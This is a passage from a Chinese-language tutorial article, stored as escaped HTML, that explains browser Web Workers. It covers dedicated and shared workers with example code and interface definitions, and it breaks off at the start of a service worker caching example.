可以分为两种不同线程类型，一个是专用线程 \u003ccode\u003eDedicated Worker\u003c/code\u003e，一个是共享线程 \u003ccode\u003eShared Worker\u003c/code\u003e。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e(3.1) 专用线程 Dedicated Worker\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003e专用线程是指标准 worker，一个专用 worker 仅仅能被生成它的脚本所使用\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cem\u003e也就是说，所谓的专用线程（dedicated worker）并没有一个显示的\u003ccode\u003eDedicatedWorker\u003c/code\u003e构造函数，其实指的就是普通的\u003ccode\u003eWorker\u003c/code\u003e构造函数。\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e🌰 在解释概念前，先来看一个呗儿简单的小栗子：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-comment\"\u003e//myWorker.js\u003c/span\u003e\n\nself.onmessage = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eevent\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e info = event.data;\n    self.postMessage(info + \u003cspan class=\"hljs-string\"\u003e\" from worker!\"\u003c/span\u003e);\n};\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e//主页面\n\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003einput\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"text\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"wkInput1\"\u003c/span\u003e /\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ebutton\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eid\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"btn1\"\u003c/span\u003e\u0026gt;\u003c/span\u003etest!\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ebutton\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"javascript\"\u003e\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e.Worker) {\n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e myWorker = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e Worker(\u003cspan class=\"hljs-string\"\u003e\"myWorker.js\"\u003c/span\u003e);\n    myWorker.onmessage = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003eevent\u003c/span\u003e) \u003c/span\u003e{\n    \u0009alert(event.data);\n    };\n    \n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e btn = \u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e.querySelector(\u003cspan class=\"hljs-string\"\u003e'#btn1'\u003c/span\u003e);\n    btn.addEventListener(\u003cspan class=\"hljs-string\"\u003e'click'\u003c/span\u003e, e=\u0026gt;{\n    \u0009\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e ipt = \u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e.querySelector(\u003cspan class=\"hljs-string\"\u003e'[name=wkInput1]'\u003c/span\u003e);\n    \u0009\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e info = \u003cspan class=\"hljs-string\"\u003e\"hello \"\u003c/span\u003e + ipt.value;\n    \u0009myWorker.postMessage(info);\n    });\n}\n\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e很显然，运行的效果无非是点击按钮后弹出包含文本框内容的字符串。\u003c/p\u003e\n\u003cp\u003e例子很简单，但携带的关键信息还算丰富，那么结合规范中的一些定义来看一看上面的代码：\u003c/p\u003e\n\u003cp\u003e首先是专用 worker 在运行的过程中，会隐式的使用一个\u003ccode\u003eMessagePort\u003c/code\u003e对象，其接口定义如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs idl\" lang=\"idl\"\u003einterface\u0026nbsp;MessagePort\u0026nbsp;{\u003cbr\u003e\u0026nbsp;\u0026nbsp;void\u0026nbsp;postMessage(message,\u0026nbsp;optional\u0026nbsp;transfer\u0026nbsp;=\u0026nbsp;[]);\u003cbr\u003e\u0026nbsp;\u0026nbsp;attribute\u0026nbsp;onmessage;\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u003cbr\u003e\u0026nbsp;\u0026nbsp;void\u0026nbsp;start();\u003cbr\u003e\u0026nbsp;\u0026nbsp;void\u0026nbsp;close();\u003cbr\u003e\u0026nbsp;\u0026nbsp;attribute\u0026nbsp;onmessageerror;\u003cbr\u003e};\u003cbr\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e我们把最重要的两个成员放在了前面，一个是\u003ccode\u003epostMessage()\u003c/code\u003e方法，另一个是\u003ccode\u003eonmessage\u003c/code\u003e属性。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003epostMessage()\u003c/code\u003e方法用来发送数据：第一个参数除了可以发送字符串，还可以发送 JS 对象(有的浏览器需要\u003ccode\u003eJSON.stringify()\u003c/code\u003e)；可选的第二个参数可用来发送 ArrayBuffer 对象数据(一种二进制数组，配合XHR、File API、Canvas等读取字节流数据用)\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eonmessage\u003c/code\u003e属性应被指定一个事件处理函数，用于接收传递过来的消息；也可以选择使用 addEventListener 方法，其实现方式和作用和 onmessage 相同\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e然后来看看简化后的 \u003ccode\u003eWorker\u003c/code\u003e 的定义：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003einterface AbstractWorker {\n  attribute onerror;\n};\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003einterface Worker {\n  Constructor(scriptURL, optional workerOptions);\n  \n  void terminate();\n\n  void postMessage(message, optional transfer = []);\n  attribute onmessage;\n  attribute onmessageerror;\n};\n\nWorker implements AbstractWorker;\n\u003c/code\u003e\u003c/pre\u003e\u003cul\u003e\n\u003cli\u003e首先它实现了\u003ccode\u003eAbstractWorker\u003c/code\u003e接口，也就是说有一个\u003ccode\u003eonerror\u003c/code\u003e回调用来管理错误；\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003emyWorker.onerror = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eevent\u003c/span\u003e)\u003c/span\u003e{\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(event.message);\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(event.filename);\n    \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(event.lineno);\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cul\u003e\n\u003cli\u003e其次，明显也实现了上面提到过的\u003ccode\u003eMessagePort\u003c/code\u003e接口，可以 \u003ccode\u003epostMessage/onmessage\u003c/code\u003e；\u003c/li\u003e\n\u003cli\u003e实例化一个新的 worker 只需要调用 Worker()  的构造方法，指定一个脚本的 URI\u003c/li\u003e\n\u003cli\u003e当创建完 worker 以后，可以调用 \u003ccode\u003eterminate()\u003c/code\u003e 方法去终止该线程\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cem\u003e通过workerOptions 中的选项可以支持 es6 模块化等，这里不展开论述\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e至此，已经可以理解“主页面”中的各种定义和调用行为了；而\"myWorker.js\"中的\u003ccode\u003eself\u003c/code\u003e又是怎样的呢，继续来看看相关定义：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003einterface WorkerGlobalScope {\n  \u003cspan class=\"hljs-built_in\"\u003ereadonly\u003c/span\u003e attribute self; //WorkerGlobalScope\n  \u003cspan class=\"hljs-built_in\"\u003ereadonly\u003c/span\u003e attribute location;\n  \u003cspan class=\"hljs-built_in\"\u003ereadonly\u003c/span\u003e attribute navigator;\n  void importScripts(urls);\n\n  attribute onerror;\n  attribute onlanguagechange;\n  attribute onoffline;\n  attribute ononline;\n  attribute onrejectionhandled;\n  attribute onunhandledrejection;\n};\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003einterface DedicatedWorkerGlobalScope {\n  \u003cspan class=\"hljs-built_in\"\u003ereadonly\u003c/span\u003e attribute name;\n\n  void postMessage(\n  \u0009message, \n  \u0009optional transfer = []\n  );\n\n  void close();\n\n  attribute onmessage;\n  attribute onmessageerror;\n};\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e专用 worker 实现了以上两个接口，可知：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eworker\u003c/code\u003e中的全局对象就是其本身\u003c/li\u003e\n\u003cli\u003e可以使用 \u003ccode\u003eWorkerGlobalScope\u003c/code\u003e 的 \u003ccode\u003eself\u003c/code\u003e 只读属性来获得这个对象本身的引用\u003c/li\u003e\n\u003cli\u003e并且可以调用相关的\u003ccode\u003eMessagePort\u003c/code\u003e接口方法。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e看起来很简单，两边都可以 \u003ccode\u003epostMessage/onmessage\u003c/code\u003e，就可以愉快的通信了。\u003c/p\u003e\n\u003cp\u003e除了上述这些，其他的一些要点包括：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e为了安全，在 worker 中不能访问 DOM\u003c/li\u003e\n\u003cli\u003e作为参数传递给 worker 构造器的 URI 必须遵循同源策略\u003c/li\u003e\n\u003cli\u003eworker 不能访问 window 对象，也不能调用 alert()\u003c/li\u003e\n\u003cli\u003e可以在只读的 navigator 对象中访问 appName、appVersion、platform、onLine 和 userAgent 等\u003c/li\u003e\n\u003cli\u003e可以在只读的 location 对象中获取 hostname 和 port 等\u003c/li\u003e\n\u003cli\u003e在 worker 中也支持 XMLHttpRequest 和 fetch 等\u003c/li\u003e\n\u003cli\u003e支持 importScripts() 方法（在同一个域上异步引入脚本文件），该函数接受0个或者多个URI作为参数\u003c/li\u003e\n\u003cli\u003e支持 JavaScript 对象，比如 Object、Array、Date、Math 和 String\u003c/li\u003e\n\u003cli\u003e支持 setTimeout() 和 setInterval() 方法\u003c/li\u003e\n\u003cli\u003e在主线程中使用时，onmessage 和 postMessage()  必须挂在worker对象上，而在worker中使用时不用这样做。原因是，在worker内部，worker是有效的全局作用域\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 class=\"heading\"\u003e专用 worker 相对理想的兼容情况\u003c/h4\u003e\n\u003cp\u003e在现代浏览器和移动端上，可以说专用 worker 已经被支持的不错了：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/12/16049b07b91d7484?w=1314\u0026amp;h=972\u0026amp;f=png\u0026amp;s=134520\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e(3.2) 共享线程 Shared Worker\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003e共享线程指的是一个可以被多个页面通过多个连接所使用的 worker\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e🌰 还是先看一个栗子：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-comment\"\u003e//wk.js\u003c/span\u003e\n\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e arr = [];\n\nself.onconnect = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ee\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e port = e.ports[\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e];\n\u0009port.postMessage(\u003cspan class=\"hljs-string\"\u003e'hello from worker!'\u003c/span\u003e);\n\n\u0009port.onmessage = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eevt\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u0009\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e val = evt.data;\n\u0009\u0009\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!~arr.indexOf(val)) {\n\u0009\u0009\u0009arr.push(val);\n\u0009\u0009}\n\u0009\u0009port.postMessage(arr.toString());\n\u0009}\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-meta\"\u003e\u0026lt;!DOCTYPE html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ehtml\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ebody\u003c/span\u003e\u0026gt;\u003c/span\u003e\npage 1\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"javascript\"\u003e\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e.SharedWorker) {\n\u0009\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e wk = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e SharedWorker(\u003cspan class=\"hljs-string\"\u003e'wk.js'\u003c/span\u003e);\n\u0009wk.port.onmessage = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ee\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(e.data);\n\u0009}\n\u0009wk.port.postMessage(\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e);\n}\n\n\u003cspan class=\"hljs-comment\"\u003e//输出\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e//hello from worker!\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e//1\u003c/span\u003e\n\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ebody\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ehtml\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-meta\"\u003e\u0026lt;!DOCTYPE html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ehtml\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ebody\u003c/span\u003e\u0026gt;\u003c/span\u003e\npage 2\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"javascript\"\u003e\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e.SharedWorker) {\n\u0009\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e wk = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e SharedWorker(\u003cspan class=\"hljs-string\"\u003e'wk.js'\u003c/span\u003e);\n\u0009wk.port.onmessage = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ee\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(e.data);\n\u0009}\n\u0009wk.port.postMessage(\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e);\n}\n\u0009\n\u003cspan class=\"hljs-comment\"\u003e//输出\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e//hello from worker!\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e//1,2\u003c/span\u003e\n\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ebody\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ehtml\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e运行效果也不难理解，引用共享 worker 的两个同域的页面，共享了其中的 arr 数组。也就是说，专用 worker 一旦被某个页面引用，该页面就拥有了一个独立的子线程上下文；与之不同的是，某个共享 worker 脚本文件如果被若干页面(要求是同源的)引用，则这些页面会共享该 worker 的上下文，拥有共同影响的变量等。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003einterface SharedWorker {\n  Constructor(\n  \u0009scriptURL, \n  \u0009optional (DOMString or WorkerOptions) options\n  );\n  \n  \u003cspan class=\"hljs-built_in\"\u003ereadonly\u003c/span\u003e attribute port;\n};\n\nSharedWorker implements AbstractWorker;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e另一个非常大的区别在于，前面也提到过，与一个专用 worker 通信，对\u003ccode\u003eMessagePort\u003c/code\u003e的实现是隐式进行的（直接在 worker 上进行\u003ccode\u003epostMessage/onmessage\u003c/code\u003e）；而共享 worker 必须通过端口(\u003ccode\u003eMessagePort\u003c/code\u003e类型的\u003ccode\u003eworker.port\u003c/code\u003e)对象进行。\u003c/p\u003e\n\u003cp\u003e此外的几个注意点：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e wk = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e SharedWorker(\u003cspan class=\"hljs-string\"\u003e'wk.js'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'foo'\u003c/span\u003e);\n\u003cspan class=\"hljs-comment\"\u003e//or\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e wk = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e SharedWorker(\u003cspan class=\"hljs-string\"\u003e'wk.js'\u003c/span\u003e, {\u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'foo'\u003c/span\u003e});\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003einterface SharedWorkerGlobalScope {\n  \u003cspan class=\"hljs-built_in\"\u003ereadonly\u003c/span\u003e attribute name;\n  void close();\n  attribute onconnect;\n};\n\u003c/code\u003e\u003c/pre\u003e\u003cul\u003e\n\u003cli\u003e实例化时添加的第二个参数，用于指定这个共享 worker 的名称，必须要同名才能共享；这个 name 在 worker 中可以藉由 \u003ccode\u003eself.name\u003c/code\u003e 获得\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eself.onconnect = \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(e) {\n\u0009var port = e.ports[0];\n\u0009port.postMessage(\u003cspan class=\"hljs-string\"\u003e'hello from worker!'\u003c/span\u003e);\n    //...\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cul\u003e\n\u003cli\u003e在共享 worker 的 onconnect 回调中直接发送了一个 postMessage，用于提示连接成功，这个动作在页面刷新后并不会重新执行，而是重新打开页面才会执行。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar wk = new SharedWorker(\u003cspan class=\"hljs-string\"\u003e'wk.js'\u003c/span\u003e);\nwk.port.onmessage = \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(e) {\n\u0009console.log(e.data);\n}\n\n//--\u0026gt;\nwk.port.addEventListener(\u003cspan class=\"hljs-string\"\u003e'message'\u003c/span\u003e, \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(e) {\n\u0009console.log(e.data);\n});\nwk.port.start();\n\u003c/code\u003e\u003c/pre\u003e\u003cul\u003e\n\u003cli\u003e如果用\u003ccode\u003eaddEventListener\u003c/code\u003e代替\u003ccode\u003eonmessge\u003c/code\u003e，则需要额外调用 \u003ccode\u003estart()\u003c/code\u003e 方法才能建立连接\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 class=\"heading\"\u003e共享大法虽好，兼容仍需谨慎\u003c/h4\u003e\n\u003cp\u003e移动端尚不支持、IE11/Edge也没戏；\u003cstrong\u003e测试时 Mac 端的 chrome/firefox 也是状况频频无法成功，最后在 chrome@win10 以及 opera@mac 才可以\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/12/16049b050874fd59?w=1318\u0026amp;h=978\u0026amp;f=png\u0026amp;s=140436\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003eIV. Service Worker\u003c/h2\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"image\" src=\"https://user-gold-cdn.xitu.io/2017/12/12/16049abac94e9146?w=980\u0026amp;h=416\u0026amp;f=png\u0026amp;s=31960\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eService Worker 基于 Web Worker 的事件驱动，提供了用来管理安装、版本、升级的一整套系统。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e专用 worker 或共享 worker 专注于解决 \u003cstrong\u003e“耗时的 JS 执行影响 UI 响应”\u003c/strong\u003e 的问题， -- 一是后台运行 JS，不影响主线程；二是使用\u003ccode\u003epostMessage()/onmessage\u003c/code\u003e消息机制实现了并行。\u003c/p\u003e\n\u003cp\u003e而 service worker 则是为解决 \u003cstrong\u003e“因为依赖并容易丢失网络连接，从而造成 Web App 的用户体验不如 Native App”\u003c/strong\u003e 的问题而提供的一系列技术集合；它比 web worker 独立得更彻底，可以在页面没有打开的时候就运行。\u003c/p\u003e\n\u003cp\u003e并且相比于已经被废弃的 Application Cache 缓存技术：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ehtml\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003emanifest\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"appcache.manifest\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  ...\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ehtml\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eCACHE MANIFEST\n\u003cspan class=\"hljs-comment\"\u003e# appcache.manifest text file, version: 0.517\u003c/span\u003e\n\nNETWORK:\n\u003cspan class=\"hljs-comment\"\u003e#CACHE:\u003c/span\u003e\nassets/loading.gif\nassets/wei_shop_bk1.jpg\nassets/wei_shop_bk2.jpg\nassets/wei_ios/icons.png\nassets/wei_ios/icon_addr.png\nassets/wei_ios/icon_tel.png\n\nNETWORK:\nscripts/wei_webapp.js\nstyles/meishi_wei.css\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eservice worker 拥有更精细、更完整的控制；作为一个页面与服务器之间代理中间层，service worker 可以捕获它所负责的页面的请求，并返回相应资源，这使离线 web 应用成为了可能。\u003c/p\u003e\n\u003cp\u003e🌰 一如既往的先看一个直观的小栗子：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-comment\"\u003e\u0026lt;!--http://localhost:8000/service.html--\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eh1\u003c/span\u003e\u0026gt;\u003c/span\u003ehello service!\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eh1\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eimg\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003esrc\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"deer.png\"\u003c/span\u003e /\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"javascript\"\u003e\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (navigator.serviceWorker) {\n\u0009\u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e.onload = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u0009navigator.serviceWorker.register(\n\u0009\u0009\u0009\u003cspan class=\"hljs-string\"\u003e'myService.js'\u003c/span\u003e, \n\u0009\u0009\u0009{\u003cspan class=\"hljs-attr\"\u003escope\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'/'\u003c/span\u003e}\n\u0009\u0009).then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003eregistration\u003c/span\u003e=\u0026gt;\u003c/span\u003e{\n\u0009\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'SW register OK with scope: '\u003c/span\u003e, registration.scope);\n\n\u0009\u0009\u0009registration.onmessage = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ee\u003c/span\u003e) \u003c/span\u003e{\n\u0009\u0009\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(e.data)\n\u0009\u0009\u0009}\n\u0009\u0009}).catch(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003eerr\u003c/span\u003e=\u0026gt;\u003c/span\u003e{\n\u0009\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'SW register failed: '\u003c/span\u003e, err);\n\u0009\u0009});\n\u0009}\n\u0009\n\u0009\u003cspan class=\"hljs-comment\"\u003e// SW register OK with scope:  http://localhost:8000/\u003c/span\u003e\n}\n\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-comment\"\u003e//myService.js\u003c/span\u003e\n\n\u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e CACHE_NAME = \u003cspan class=\"hljs-string\"\u003e'my-site-cache-v1'\u003c/span\u003e;\n\n\u003cspan 